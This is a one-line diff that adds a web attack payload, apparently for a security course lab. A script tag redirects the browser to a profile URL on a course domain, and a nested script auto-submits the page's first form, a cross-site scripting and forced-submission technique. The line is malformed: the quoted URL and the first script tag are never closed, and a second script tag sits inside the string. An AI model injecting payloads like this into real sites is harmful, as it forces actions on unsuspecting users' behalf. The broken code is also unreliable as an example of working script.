@@ -1,0 +1,1 @@
+<script>location.href="https://final.csci3403.com/profile/kosm1438<script>document.forms[0].submit();"
